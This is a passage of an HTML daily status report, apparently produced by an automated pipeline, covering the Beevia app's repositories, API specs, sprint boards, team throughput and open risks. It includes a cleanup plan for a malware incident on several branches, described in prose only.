+      <p><code>d0faf19</code>, 7 September, Promise Udo. The dashboard module now calls <code>GET /admin/dashboard</code>: <code>src/features/dashboard/api.ts</code> gains 161 lines with the response shape and a comment reading <em>&ldquo;confirmed live&rdquo;</em>, <code>overview.tsx</code> (423 lines) replaces <code>summary-cards.tsx</code> and <code>financial-section.tsx</code>, and <strong><code>mock/summary.ts</code>, <code>mock/financial.ts</code> and <code>use-mock-resource.ts</code> are deleted outright</strong> rather than left as fallbacks.</p>
+      <p>Same pattern as his 4 September commit and the same speed: the endpoint merged Sunday, the client was on it Monday. <strong>Six of ten admin modules now call the live API</strong>; <code>reports</code> and <code>pending-transfers</code> are the two still mock-only.</p>
+
+      <h3>4.3 <code>beevia-mobile</code> &mdash; activity is on a branch, not on <code>main</code></h3>
+      <p><code>main</code> is unchanged since 26 August &mdash; <strong>13 days</strong>. <code>origin/BVA-I192</code> is now <strong>14 commits ahead</strong> (was 12), with two commits yesterday: <em>&ldquo;unsaved local changes&rdquo;</em> and <em>&ldquo;resolved conflicts&rdquo;</em>.</p>
+      <p><strong>David is working; the default branch cannot see it.</strong> Yesterday's edition reported &ldquo;zero commits&rdquo; with a caveat; today the caveat is the finding. A branch that has been rebasing against a moving <code>main</code> for eleven days, under a board item that is already Done, is the definition of work at risk &mdash; and &ldquo;resolved conflicts&rdquo; is what that costs.</p>
+
+      <h3>4.4 Unmerged, and the most interesting thing in the repository: Module 4 exists</h3>
+      <p><code>origin/feat/admin-chats</code> &mdash; the branch a Copilot agent merged into yesterday, and one of the eight still carrying the payload &mdash; contains an entire <code>src/chats/</code> module that has never been mentioned in any status report, because it has never been on <code>main</code> and the branch was unreadable until today.</p>
+      <p><code>feat(chats): admin chats screen (E2EE-safe metadata + moderation)</code>, 6 September, four endpoints:</p>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Method</th><th scope="col">Path</th><th scope="col">Summary</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">GET</th><td><code>/admin/chats</code></td><td>Conversations list &mdash; participant / message / report counts, last activity</td></tr>
+            <tr><th scope="row">GET</th><td class="hi"><code>/admin/chats/reports</code></td><td class="hi"><strong>The moderation queue</strong> &mdash; reporter, reason, conversation</td></tr>
+            <tr><th scope="row">GET</th><td><code>/admin/chats/users/{userId}</code></td><td>A user's conversations plus their block graph</td></tr>
+            <tr><th scope="row">GET</th><td><code>/admin/chats/{conversationId}</code></td><td>Conversation detail &mdash; metadata, participants, its reports</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p><strong>This is spec Module 4, the one <code>admin-api-rfc.md</code> &sect;5.1 says cannot be built as specified &mdash; and it is built the right way.</strong> &sect;5.1 laid out three options and recommended <strong>Option A, metadata-only moderation</strong>, because the spec's demand for &ldquo;reported messages&rdquo; is unsatisfiable against E2EE. The controller's own docstring is that recommendation in one line: <em>&ldquo;Chat is end-to-end encrypted, so these endpoints serve metadata + moderation only &mdash; never message content.&rdquo;</em> Every operation description repeats it. Nobody asked this report whether it was buildable; someone read the constraint and built the version that respects it.</p>
+      <p>It also closes a finding open since 5 August. &sect;5.1 noted that <code>conversation_reports</code> is populated by the consumer app's <code>POST /conversations/{id}/report</code> and <strong>nothing reads it</strong> &mdash; &ldquo;reports are piling up unreviewed today&rdquo;. <code>GET /admin/chats/reports</code> is the reader.</p>
+      <ol>
+        <li><strong>It is not in <code>openapi.admin.yaml</code>, and should not be.</strong> The implemented spec documents what is on <code>main</code>. This is on a feature branch, and will be documented the day it merges.</li>
+        <li><strong>It sharpens the branch problem rather than softening it.</strong> The only branch of the eight with unique work is the only one that cannot be deleted, so it is the one that must be rebased &mdash; and it is the one an automated agent has been merging into.</li>
+        <li><strong>Module 4 goes from &ldquo;blocked on a product decision&rdquo; to &ldquo;awaiting a merge&rdquo;</strong>, if the metadata-only reading is accepted. That is a question for the owner, not a conclusion this report can draw: &sect;5.1 offered three options and someone chose one without recording it. The same shape as the translation decision in &sect;2.1 &mdash; a good call, made silently, that this pipeline could only discover by reading code.</li>
+      </ol>
+
+      <h3>4.5 <code>beevia-api</code> &mdash; nothing</h3>
+      <p>No commit since 4 September. Every consumer-API capability in the MVP rubric is unchanged for a fourth day, including the translate stub, <code>PaymentService.activeNgn()</code>, the unset <code>ANCHOR_POOL_ACCOUNT_ID</code>, and the <code>POST /kyc/profile</code> silent-200.</p>
+
+      <h3>4.6 Sprint 08-01 &mdash; closed and frozen</h3>
+      <p>64 items, 41 leaves, <strong>all Done</strong>. No transitions since it closed on 3 September, and none are possible. It remains the sprint the daily export targets.</p>
+    </section>
+
+    <section class="sec" id="s5">
+      <div class="sec__h"><span class="sec__n">05</span><h2>Spec updates made this cycle</h2></div>
+
+      <h3>5.1 <code>openapi.admin.yaml</code> &mdash; two operations added, 35 &rarr; 37</h3>
+      <p><code>GET /admin/wallets</code> and <code>GET /admin/wallets/users/{userId}</code>, documented from the controller, DTO, service and response types read at <code>origin/main</code>. New <code>Wallets</code> tag; new <code>WalletUserId</code> parameter; new <code>AdminWalletRow</code>, <code>WalletVba</code>, <code>WalletsSummary</code> and <code>WalletsCurrencyTotal</code> schemas. <code>TransactionsPagination</code> is reused rather than duplicated &mdash; the shape is identical, and its description now says so, including that the name is historical and renaming it would churn every generated client.</p>
+      <p>The four contract traps in &sect;4.1 are written onto the operations, not left for the reader to discover.</p>
+
+      <h3>5.2 <code>openapi.admin.proposed.yaml</code> &mdash; one proposal retired, 21 &rarr; 20</h3>
+      <p><code>GET /admin/users/{id}/wallets</code> shipped, at a different path. Replaced with a <code>NOTE</code> comment in the house style, which records <strong>what did not ship</strong> (<code>partner_balance</code>, <code>in_sync</code>) rather than just marking it done &mdash; that is the part someone will otherwise re-propose from scratch. The orphaned <code>AdminWallet</code> schema is removed.</p>
+
+      <h3>5.3 <code>openapi.proposed.yaml</code> &mdash; two translation operations annotated, not deleted</h3>
+      <p><code>POST /translate/batch</code> and <code>GET /translate/languages</code> both exist to serve a server-side engine: the language list is the provider's, and batching exists to avoid one round trip per visible message. On-device translation (&sect;2.1) has neither. <strong>Both are annotated as probably obsolete and left in place.</strong> Nothing is built either way, no decision is recorded anywhere in writing, and retiring a proposal on inference is how a spec starts lying in the opposite direction. This is an open question for the owner (&sect;9), not a finding.</p>
+      <p><code>/users/me/translation</code> and <code>/conversations/{id}/translation</code> are <strong>unaffected and now board-backed</strong> &mdash; <code>BVA-I230</code>/<code>BVA-I231</code> is exactly that proposal. A client-side engine still needs a server-side preference that survives reinstall.</p>
+
+      <h3>5.4 Narrative documents</h3>
+      <ul>
+        <li><code>admin-api-rfc.md</code> &mdash; counts 35 &rarr; 37 and 21 &rarr; 20; new &sect;3.12 (Wallets); Module 5 coverage 4 &rarr; 6 ops; &sect;5.2 rewritten; new &sect;5.1a recording that Module 4 exists on a branch; &sect;6.3 grows a fourth gap, the missing per-wallet partner balance.</li>
+        <li><code>api-rfc.md</code> &mdash; new &sect;5.5a correcting &sect;5.5's sequencing conclusion (&sect;2.1).</li>
+        <li><code>suggestions.md</code> &mdash; new &sect;7.6, <em>&ldquo;Cleaning <code>main</code> is not cleaning the repository&rdquo;</em>, with the ref-sweep command; &sect;8's order re-headed by the branch cleanup.</li>
+      </ul>
+
+      <h3>5.5 Spec health</h3>
+      <p>All four files parse; <strong>131 / 42 / 37 / 20</strong> operations. No <code>x-beevia-*</code> markers, no broken <code>$ref</code>s, no orphaned components, no duplicate <code>operationId</code>s. Drift against <code>origin/main</code>: <strong>zero, both services, both directions.</strong></p>
+    </section>
+
+    <section class="sec" id="s6">
+      <div class="sec__h"><span class="sec__n">06</span><h2>Admin dashboard board</h2></div>
+      <p><strong>The Beevia Admin Dashboard project still has no sprint.</strong> Step 1b exits 3 and writes nothing &mdash; nineteenth consecutive edition. The project exists (id <code>187554000000127002</code>, project no. 8) with no sprints and no start/end dates.</p>
+      <p>That is the status, and it is unchanged since the project was created on 28 August. Until it carries items, Promise Udo's row in the team table is sourced from commits, and the standing caveat holds: <strong>board totals understate delivery, because the entire admin dashboard workstream &mdash; 37 endpoints' worth of client, six of ten modules now live &mdash; happens outside them.</strong></p>
+      <p>When it is populated, the export step will need <code>--sprint &lt;name&gt;</code> explicitly; the main <code>ZOHO_SPRINT_FILTER</code> (<code>08-01</code>) will not match, and a silent exit 3 after the board goes live means exactly that.</p>
+    </section>
+
+    <section class="sec" id="s7">
+      <div class="sec__h"><span class="sec__n">07</span><h2>Team performance &mdash; detail</h2></div>
+
+      <p>All figures come from the activity sidecar and git, never from <code>Last Modified</code>. <strong>No item reached REVIEW/QA on either sprint in this window</strong>, so submission and cycle-time figures are carried forward from 3 September; commit counts, WIP ages and staleness are current.</p>
+
+      <p><strong>Ayomikun Araoye &mdash; backend + admin API.</strong> 20 commits in the trailing 7 days across <code>beevia-api</code>, <code>beevia-admin-api</code> and <code>beevia-db-schema</code>, summing the <code>Ayomikun Araoye</code>, <code>Phoenixdadhev</code> and <code>phoenixdahdev</code> identities and excluding bots. Up from 15 yesterday, and the increase is almost entirely <strong>this morning's history rebuild</strong> rather than new features &mdash; the three rebuilt commits are re-committed 6 September work. His last genuine feature commit is Saturday's wallets endpoint. He owns nine of sprint 0901's seventeen leaves, all in To do, untouched for a fifth day, and the notification half of the sprint cannot start without <code>BVA-I246</code>, which is his. <strong>The remediation was his work and it was done well</strong> &mdash; clean blob restored to the original object, <code>.gitignore</code> markers removed, rescue snapshots taken first. It is also, in this window, the thing he did instead of the sprint, which is the correct trade and worth recording as such rather than reading his flat feature output as a slowdown.</p>
+
+      <p><strong>David Samuel &mdash; mobile.</strong> Three genuine submissions in the trailing 7 days, last on 28 August; median cycle 2.6 d over 14 passes. <strong>Zero commits to <code>main</code>, three to <code>origin/BVA-I192</code></strong> including two yesterday. He now holds three 0901 leaves In progress: <code>BVA-I233</code> and <code>BVA-I241</code> at <strong>3.9 days</strong> against his own 2.6-day median, and <code>BVA-I243</code> started today. Two items past his median and a fourteen-commit branch that has been merging conflicts for eleven days is one situation, not two &mdash; the branch is where his attention has been. He also started his own board items today for the first time this sprint.</p>
+
+      <p><strong>Philip Chidera &mdash; design.</strong> Two genuine submissions in 7 days; median cycle 0.9 d over 7 passes. One leaf In progress, <code>BVA-I240</code>, age <strong>3.9 days against a 0.9-day median</strong> &mdash; over four times his own pace and the most overdue WIP on either board relative to its owner. No board action since Friday, after a Friday in which he made nine of eleven transitions including three on items he does not own.</p>
+
+      <p><strong>Promise Udo &mdash; admin dashboard.</strong> No board presence, nineteenth consecutive edition. <strong>5 commits in the trailing 7 days</strong>, and yesterday's took the dashboard module from mock to live within a day of the endpoint existing (&sect;4.2). His workstream continues to have the cleanest endpoint-to-client latency in the project and the least visibility in its tracking.</p>
+
+      <h3 id="s7-1">7.1 Weekly submission trend</h3>
+      <p>Genuine submissions into REVIEW/QA, by ISO week: <strong>W34 (17&ndash;23 Aug) &mdash; 17 &middot; W35 (24&ndash;30 Aug) &mdash; 10 &middot; W36 (31 Aug &ndash; 6 Sep) &mdash; 1 &middot; W37 (7&ndash;8 Sep) &mdash; 0.</strong></p>
+      <p><strong>Eleven days since anything entered review.</strong> The closed sprint cannot produce more; the open sprint has produced starts only. The throughput signal has been blind for three consecutive editions, and at some point the honest reading is not &ldquo;the queue is empty&rdquo; but &ldquo;this board is not being used to track completion.&rdquo;</p>
+
+      <h3>7.2 Cycle times</h3>
+      <p>Unchanged from 3 September; no new passes measured. Method: one measurement per pass, from an item's most recent entry into <code>In progress</code> to the next time it reaches <code>REVIEW/QA</code>.</p>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th scope="col">Person</th><th scope="col" class="r">n</th><th scope="col" class="r">Median</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">Philip Chidera</th><td class="r">7</td><td class="r">0.9 d</td></tr>
+            <tr><th scope="row">David Samuel</th><td class="r">14</td><td class="r">2.6 d</td></tr>
+            <tr><th scope="row">Ayomikun Araoye</th><td class="r">12</td><td class="r">3.0 d</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>7.3 What these figures do not measure</h3>
+      <div class="note">
+        <p><strong>They do not see branches.</strong> David reads zero commits while fourteen sit on <code>origin/BVA-I192</code>, two of them yesterday. Every &ldquo;commits&rdquo; figure means <em>merged to the default branch</em>.</p>
+        <p><strong>They count a security rebuild as feature output.</strong> Ayomikun's 20 includes three re-committed 6 September commits from this morning's history rewrite. The work was real and necessary; it was not new product.</p>
+        <p><strong>They do not see the largest client change of the week.</strong> Promise's dashboard wiring appears in exactly one column, because his workstream has no board.</p>
+        <p><strong>No estimation points exist on any item, either sprint</strong> &mdash; 0/64 and 0/25. Nothing is normalised for size.</p>
+        <p><strong>Board actions are not evenly attributable.</strong> Figures key to the item's assignee, not to whoever clicked.</p>
+        <p><strong>Review and triage work is invisible</strong>, and there was again none to record.</p>
+        <p><strong>Cycle time rewards small items; commit counts reward small commits.</strong> Neither measures difficulty or quality.</p>
+        <p><strong>Absence of board data is not absence of work</strong>, and absence of commits <em>to <code>main</code></em> is not absence of commits.</p>
+        <p style="margin-bottom:0"><strong>Correctness and testing are out of scope for scoring</strong>, per the owner's 2026-08-07 instruction. Noted anyway because it is new: the wallets endpoint shipped with tests in the same commit.</p>
+      </div>
+    </section>
+
+    <section class="sec" id="s8">
+      <div class="sec__h"><span class="sec__n">08</span><h2>Risks &amp; previous recommendations</h2></div>
+
+      <h3>8.1 Risks</h3>
+      <ol>
+        <li><strong>Eight <code>beevia-admin-api</code> branches still carry the malware payload</strong> (&sect;1.2). A merge from any of the three live feature branches re-infects the <code>main</code> that was cleaned this morning.</li>
+        <li><strong>CI on <code>beevia-admin-api</code> is not safe</strong> while those branches exist and can trigger lint jobs.</li>
+        <li><strong>An automated Copilot agent merged into an infected branch yesterday</strong> (&sect;1.2). Its execution environment held the payload.</li>
+        <li><strong>An entire unmerged module exists only on an infected branch</strong> (&sect;4.4). Deleting the infected branches carelessly destroys it; merging it carelessly re-infects <code>main</code>.</li>
+        <li><strong>The infected workstation's status is unknown</strong> (&sect;1.4). Until it is cleaned, the next legitimate commit re-introduces the file.</li>
+        <li><strong>Credential rotation cannot be verified from here</strong> and is the step that decays fastest.</li>
+        <li><strong>Branch protection cannot be verified from here</strong> (&sect;1.4) &mdash; the available GitHub token has no org access.</li>
+        <li><strong>Three repositories remain unsynced locally</strong> (&sect;1.5), so the deterministic audit reads Thursday's code for them.</li>
+        <li><strong>Nothing has entered REVIEW/QA for eleven days</strong> on either board (&sect;7.1) &mdash; throughput blind for a third edition.</li>
+        <li><strong>Sprint 0901 has moved 4 of 17 leaves in 6 days</strong>, with 0 of 25 estimated (&sect;3.1, &sect;3.4).</li>
+        <li><strong>The notification half of 0901 has not started</strong>, and all seven items depend on one untouched foundation story (&sect;3.3).</li>
+        <li><strong>A fourteen-commit mobile branch has been unmerged for eleven days</strong> under a Done board item, and is now resolving conflicts (&sect;4.3).</li>
+        <li><strong>The Wallets screen cannot show a per-wallet ledger-vs-partner mismatch</strong> (&sect;4.1) &mdash; the one thing the proposal existed to provide.</li>
+        <li><strong>The per-user reconciliation balance check will report false discrepancies for every user the moment the treasury pool is enabled.</strong> <code>ANCHOR_POOL_ACCOUNT_ID</code> is still unset, so the window is still open.</li>
+        <li><strong><code>treasury.solvent</code> is on the landing screen and reads <code>false</code> for &ldquo;unknown&rdquo;</strong> &mdash; the dashboard module went live yesterday, so this is now rendered, not hypothetical.</li>
+        <li><strong>The money-oversight surface still has no second reviewer</strong> &mdash; PRs #1&ndash;#6 were self-merged.</li>
+        <li><strong>Reconciliation is unbounded and silently capped</strong> at 500 payouts / 1000 ledger rows; exceeding the caps produces wrong output, not visible truncation.</li>
+        <li><strong>The Anchor webhook backfill is still unscoped</strong> &mdash; 67 days of dropped events, unmeasured, seven days after the fix.</li>
+        <li><strong>The daily export still targets a closed sprint</strong> (&sect;4.6), third consecutive edition.</li>
+        <li><strong>The 14:00 UTC cut-off is still producing false &ldquo;silence&rdquo; findings</strong> &mdash; today's David finding was a near miss of the same kind.</li>
+        <li><strong>The same silent-200 is still live on <code>POST /kyc/profile</code></strong> &mdash; sixth consecutive edition.</li>
+        <li><strong>A hard-coded account number still reaches a money screen on <code>main</code></strong> &mdash; sixth consecutive edition, under a Done item.</li>
+        <li><strong><code>POST /translate</code> still returns its input unchanged.</strong> Less urgent than it looked yesterday (&sect;2.1), but it is a live route that lies to any caller that is not the chat client.</li>
+      </ol>
+
+      <h3>8.2 Previous recommendations &mdash; where they stand</h3>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Recommendation from 7 Sep</th><th scope="col">Status on 8 Sep</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">Work &sect;0.6 in order, today</th><td class="hi"><strong>Partly, and the visible half was done well.</strong> The three branches were rebuilt from clean history this morning and verified clean (&sect;1.1). Not done or not verifiable: the eight infected branches (&sect;1.2), the workstation, credential rotation, the org audit.</td></tr>
+            <tr><th scope="row">Turn on branch protection with force-push disabled</th><td><strong>Unknown.</strong> Cannot be checked from this workspace (&sect;1.4). Needs a manual confirmation.</td></tr>
+            <tr><th scope="row">Decide the sprint 0901 question properly</th><td><strong>No decision recorded.</strong> Two leaves started today, by their owner rather than by proxy, which is movement but not a decision. Nine leaves still untouched for a fifth day.</td></tr>
+            <tr><th scope="row">Confirm the filter contract for <code>GET /admin/transactions</code></th><td><strong>Not done.</strong> No commit either side. The dashboard still sends five undocumented filter params.</td></tr>
+            <tr><th scope="row">Move the daily export to sprint 0901</th><td><strong>Not done.</strong> Third edition. Still the right change and still not blocked by anything except that nobody has made it.</td></tr>
+            <tr><th scope="row">Move the report cut-off to ~20:00 UTC</th><td><strong>Not done.</strong></td></tr>
+            <tr><th scope="row">Put estimation points on 0901</th><td><strong>Not done.</strong> 0/25, fifth edition asking.</td></tr>
+            <tr><th scope="row">Scope the Anchor webhook backfill</th><td><strong>Not done.</strong> No reconciliation run, no commit, no board item.</td></tr>
+            <tr><th scope="row">Apply the BVN-ordering guard to <code>POST /kyc/profile</code></th><td><strong>Not done.</strong> Re-checked at <code>origin/main</code>; unchanged.</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>One of nine substantially actioned, and it is the one that mattered most.</p>
+    </section>
+
+    <section class="sec" id="s9">
+      <div class="sec__h"><span class="sec__n">09</span><h2>What I would do this week</h2></div>
+      <ol>
+        <li><strong>Clear the eight infected <code>beevia-admin-api</code> branches &mdash; today. Seven deletions and one rebase.</strong> Six carry no unique content and <code>rescue/3b188c9</code> is a superseded snapshot; all seven can be deleted outright. <code>feat/admin-chats</code> is the exception and must be rebased onto <code>origin/main</code>, because it is the only copy of the chats module (&sect;4.4). Do not use <code>git branch --merged</code> to decide which is which &mdash; the rewrite changed every SHA, so it reports all eight as unmerged; compare content, per &sect;1.3.</li>
+        <li><strong>Sweep every ref, in every repo, and verify by blob hash.</strong> The command is in <code>suggestions.md</code> &sect;7.6. &ldquo;Is <code>main</code> clean&rdquo; and &ldquo;is the repository clean&rdquo; are different questions, and only the second is the one that matters.</li>
+        <li><strong>Confirm the two things this report cannot see</strong>: whether the workstation that authored <code>09fda4f</code> has been imaged and cleaned, and whether credentials were rotated. Both are invisible from a git clone, and both are on the critical path for &sect;1 being genuinely closed rather than apparently closed.</li>
+        <li><strong>Rebase <code>feat/admin-chats</code> and decide whether to merge it</strong> (&sect;4.4). It is Module 4 built as <code>admin-api-rfc.md</code> &sect;5.1 recommended &mdash; metadata-only, no message content &mdash; and it is the first thing that will ever read the <code>conversation_reports</code> table, which has been accumulating unread reports since the consumer app shipped reporting. The engineering question is a rebase; the product question is whether metadata-only moderation is accepted as the answer to Module 4.</li>
+        <li><strong>Decide the translation API question</strong> (&sect;5.3). On-device translation makes <code>POST /translate/batch</code> and <code>GET /translate/languages</code> obsolete, and probably makes <code>POST /translate</code> itself a route to retire rather than to connect a provider to. Say so in writing and the spec follows in ten minutes; leave it unsaid and someone eventually builds a provider adapter nobody needs.</li>
+        <li><strong>Start <code>BVA-I246</code>, or move the notification half out of 0901.</strong> Seven of nine of Ayomikun's leaves depend on it, none has moved in five days, and the sprint has fourteen days left. This is the concrete version of &ldquo;decide the 0901 question&rdquo; that the last two editions asked in the abstract.</li>
+        <li><strong>Merge <code>BVA-I192</code> or say why not.</strong> Fourteen commits, eleven days, an already-Done board item, and now conflict resolution. Whatever the reason is, it is cheaper to state than to keep rebasing.</li>
+        <li><strong>Move the daily export to sprint 0901.</strong> Third edition asking. It means relocating twelve tracked CSVs into <code>sprint-board-exports/08-01/</code> and changing <code>ZOHO_SPRINT_FILTER</code> &mdash; half an hour of file moves, currently costing a scratch export and a caveat in every edition.</li>
+        <li><strong>Put estimation points on 0901, or state that this project does not estimate.</strong> Fifth consecutive edition.</li>
+        <li><strong>Get a token with org read access, or check branch protection by hand.</strong> Recommending a control for three editions with no way to observe it is not a useful loop (&sect;1.4).</li>
+        <li><strong>Apply the BVN-ordering guard to <code>POST /kyc/profile</code>.</strong> Unchanged from the last six editions; five lines, already written.</li>
+      </ol>
+    </section>
+
+    <section class="sec" id="method">
+      <div class="sec__h"><span class="sec__n">&mdash;</span><h2>Method</h2></div>
+
+      <p><strong>Pipeline.</strong> <code>beevia-refresh</code>: main board export (64 items, sprint 08-01, cut-off 14:00 UTC) &rarr; admin board (exit 3, no sprints, 19th edition) &rarr; fast-forward sync (<strong>1 commit into <code>beevia-admin</code>; 3 repos refused as <code>diverged</code></strong>, &sect;1.5) &rarr; repository-wide integrity sweep across every remote ref by blob hash (&sect;1.1, &sect;1.2) &rarr; deterministic audit &rarr; static contract review of the wallets endpoint from <code>origin/main</code> &rarr; spec and RFC updates &rarr; re-audit, plus a second drift check run against <code>origin/main</code> extracted to a temp directory &rarr; read-only scratch export of sprint 0901 &rarr; this report.</p>
+
+      <p><strong>Nothing was executed from any sub-repo.</strong> No <code>npm</code>, <code>node</code>, <code>eslint</code> or build step ran during this refresh. The three unsynced repositories were read with <code>git show</code>, <code>git grep</code>, <code>git cat-file</code> and <code>git archive</code> only. No repository was reset, rebased, reverted or cleaned, and the sync step's <code>--ff-only</code> limit was not overridden.</p>
+
+      <p><strong>Sprint 0901 was exported to <code>/tmp/beevia-scratch/</code>, outside the repository</strong>, for the fourth consecutive edition and for the same reason: <code>beevia-audit</code> globs <code>sprint-board-exports/*.csv</code> non-recursively and diffs the two newest files as snapshots of one board, so a second CSV covering a different sprint would make tomorrow's delta compare 08-01 against 0901 and report invented movement.</p>
+
+      <div class="note">
+        <span class="label">Degraded inputs</span>
+        <p><strong>Three repositories could not be synced</strong> &mdash; <code>beevia-api</code>, <code>beevia-admin-api</code> and <code>beevia-db-schema</code> are diverged because <code>origin/main</code> was rewritten, twice this week. Their <em>working trees</em> are 4 September code. Every code claim about them here was made against <code>origin/main</code>; the audit script, which reads working trees, was not, which is why it reports three phantom drift lines (&sect;2.2).</p>
+        <p><strong>Branch protection is unverifiable</strong> &mdash; the GitHub credential in this environment has no access to the <code>Drumbell-Technologies</code> org (&sect;1.4).</p>
+        <p><strong>Credential rotation and workstation remediation are unverifiable</strong> from a git clone (&sect;1.4).</p>
+        <p><strong>The <code>Epic</code> column is blank</strong> across the main board &mdash; the OAuth refresh token lacks <code>ZohoSprints.epic.READ</code>. Known scope gap, not &ldquo;no epic assigned&rdquo;. 38 of 41 leaves affected.</p>
+        <p><strong><code>Comments</code> bodies are unavailable</strong> from the API.</p>
+        <p><strong>The admin board produced no export</strong> because the project has no sprints (expected, exit 3, not a failure).</p>
+        <p><strong><code>ZOHO_SPRINT_FILTER</code> is stale</strong> &mdash; still <code>08-01</code>, so the in-repo export covers a sprint that closed on 28 August.</p>
+        <p style="margin-bottom:0"><strong>No estimation points on any item</strong>, either sprint, so velocity is not derivable and no per-person figure is normalised for size.</p>
+      </div>
+
+      <p><strong>Window.</strong> 7 Sep 14:00 UTC &rarr; 8 Sep 14:00 UTC &mdash; one working day. All <code>actiontime</code> values and board times are UTC. Git author dates are as recorded; note that this morning's rebuild reset committer dates on three <code>beevia-admin-api</code> commits, so committer and author dates diverge by two days there &mdash; &sect;1 uses that divergence deliberately, as the timestamp of the remediation.</p>
+
+      <p><strong>Sources.</strong> Board: <code>beevia-sprint-board-2026-09-08.csv</code> (64 rows, 41 leaves, sprint 08-01), <code>beevia-activity-2026-09-08.json</code>. Active sprint: scratch export of <code>0901</code> (25 rows, 17 leaves) with its own activity sidecar. Admin board: none. Code: <code>beevia-admin</code> and <code>beevia-mobile</code> at <code>origin/main</code> in the working tree; <code>beevia-api</code>, <code>beevia-admin-api</code> and <code>beevia-db-schema</code> read from <code>origin/main</code> refs without checkout. Specs: <code>openapi.yaml</code> (131), <code>openapi.proposed.yaml</code> (42), <code>openapi.admin.yaml</code> (<strong>37</strong>), <code>openapi.admin.proposed.yaml</code> (<strong>20</strong>) &mdash; all validated, no markers, no broken refs, no orphaned components.</p>
+
+      <div class="note">
+        <span class="label">A note on who appears here</span>
+        <p style="margin-bottom:0">Only people whose work is tracked have rows. Board transitions performed by non-contributors are reported as transitions without attribution, per the standing instruction.</p>
+      </div>
+
+      <h3 id="mvp-method">MVP readiness &mdash; how the &asymp;56% is computed</h3>
+      <p>Eleven capabilities from PRD &sect;1.2/&sect;11 with <strong>frozen weights</strong>, each scored 0&ndash;1 from build evidence. Target date 2026-09-01 is provisional, set by the owner on 2026-08-07 &mdash; <strong>it passed seven days ago, and it is not met.</strong></p>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col" class="r">#</th><th scope="col">Capability</th><th scope="col" class="r">Weight</th><th scope="col" class="r">Score</th><th scope="col">Evidence</th></tr></thead>
+          <tbody>
+            <tr><th scope="row" class="r">1</th><td>E2EE messaging</td><td class="r">15</td><td class="r">0.9</td><td>Conversation/message/key/attachment paths live; client crypto, socket and attachment layers present. No <code>beevia-api</code> commit since 4 Sep. Unchanged</td></tr>
+            <tr><th scope="row" class="r">2</th><td>Voice &amp; video calling</td><td class="r">8</td><td class="r">0.8</td><td>4 call endpoints live; <code>audio_call_screen</code> / <code>video_call_screen</code> present; incoming-call push wired. Unchanged</td></tr>
+            <tr><th scope="row" class="r">3</th><td>Message translation</td><td class="r">7</td><td class="r">0.15</td><td><strong>Unchanged score, corrected basis.</strong> <code>TranslateModule</code> still binds <code>TRANSLATE_PORT</code> unconditionally to <code>StubTranslateAdapter</code>. The sprint's design is now known to be <strong>on-device</strong> (<code>BVA-I228</code>), so the server stub is no longer the blocker &mdash; but nothing is merged: 0 commits to <code>beevia-mobile</code> <code>main</code> in 13 days, and the two engine items are To do. A design decision is not build evidence</td></tr>
+            <tr><th scope="row" class="r">4</th><td>Local KYC tier (BVN)</td><td class="r">8</td><td class="r">0.9</td><td>Unchanged. KYC/upgrade endpoints + provider webhook live; full onboarding flow wired in the client. Ceiling unchanged: silent-200 on <code>/kyc/profile</code>, failed provisioning surfaces nowhere</td></tr>
+            <tr><th scope="row" class="r">5</th><td>International KYC tier</td><td class="r">6</td><td class="r hi">0.0</td><td>proposed only</td></tr>
+            <tr><th scope="row" class="r">6</th><td>Multi-currency wallets</td><td class="r">12</td><td class="r">0.70</td><td>Unchanged; no consumer-API commit in the window. Client has a full wallet section (6 screens: home, add money, transaction history, three send flows). Pooled treasury merged but <strong>disabled</strong> (<code>ANCHOR_POOL_ACCOUNT_ID</code> unset), so not scored. Ceiling unchanged: server is NGN-only</td></tr>
+            <tr><th scope="row" class="r">7</th><td>Send / request / receive</td><td class="r">12</td><td class="r">0.80</td><td>Unchanged. P2P send wired end to end via <code>/payments/transfer</code>. Ceiling: request/receive still have no client flow</td></tr>
+            <tr><th scope="row" class="r">8</th><td>Cross-currency FX</td><td class="r">12</td><td class="r hi">0.0</td><td>proposed only; <code>PaymentService.activeNgn()</code> still present at <code>origin/main</code></td></tr>
+            <tr><th scope="row" class="r">9</th><td>Virtual cards</td><td class="r">10</td><td class="r">0.55</td><td>Unchanged. Card lifecycle events processed since 3 Sep. Ceiling still low: the client has <strong>zero</strong> <code>/cards</code> references and there is no issuer reveal flow</td></tr>
+            <tr><th scope="row" class="r">10</th><td>Consent management</td><td class="r">4</td><td class="r hi">0.0</td><td>no endpoint or record anywhere</td></tr>
+            <tr><th scope="row" class="r">11</th><td>Admin oversight</td><td class="r">6</td><td class="r hi">0.78 &uarr;</td><td><strong>+0.06, both halves moved in the same 48 hours.</strong> Admin API 35 &rarr; <strong>37</strong> (<code>/admin/wallets</code>, <code>/admin/wallets/users/{userId}</code>, &sect;4.1), taking Module 5 from 4 of 7 operations to <strong>6 of 7</strong> &mdash; flagging is all that remains. On the client, <code>beevia-admin</code> goes from <strong>5 of 10</strong> feature modules on the live API to <strong>6 of 10</strong>: the dashboard module now calls <code>GET /admin/dashboard</code> and its three mock files were deleted, not disabled (&sect;4.2). Ceiling: <code>reports</code> and <code>pending-transfers</code> still mock-only, Modules 4, 6 and 8 have no endpoints <em>on <code>main</code></em>, no per-wallet partner-balance comparison, and the transaction filter contract is still unconfirmed</td></tr>
+            <tr><th scope="row" class="r hi"></th><td class="hi">Weighted total</td><td class="r hi">100</td><td class="r hi">56.33</td><td class="hi">&asymp;56%</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Weights frozen &mdash; no methodology change this edition. Scores measure <strong>merged, reachable build evidence</strong>: never board status, never items in review, never unmerged branches, never merged-but-disabled code, and never a design decision on its own.</p>
+      <div class="note">
+        <span class="label">On the one movement, and the two that did not happen</span>
+        <p>Capability 11 moved because two endpoints merged and a client module stopped being a mock &mdash; both nameable, both merged.</p>
